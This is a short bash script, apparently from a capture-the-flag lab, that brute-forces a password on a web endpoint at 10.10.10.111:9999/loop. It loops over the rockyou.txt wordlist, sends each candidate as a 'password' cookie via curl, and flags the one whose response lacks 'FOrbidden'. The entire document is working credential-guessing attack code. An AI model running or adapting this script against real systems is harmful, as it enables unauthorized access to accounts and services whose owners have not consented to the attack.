#!/bin/bash

while read  p; do
    result=`curl -b "password=$p" 10.10.10.111:9999/loop 2>&-`
    if echo $result | grep -q 'FOrbidden' ; then echo -e "\nNOT \033[31m $p\033[0m\n"; else echo -e "\n\n\nIT IS \033[32m $p \033[0m \n\n\n"; fi
done < /usr/share/wordlists/rockyou.txt
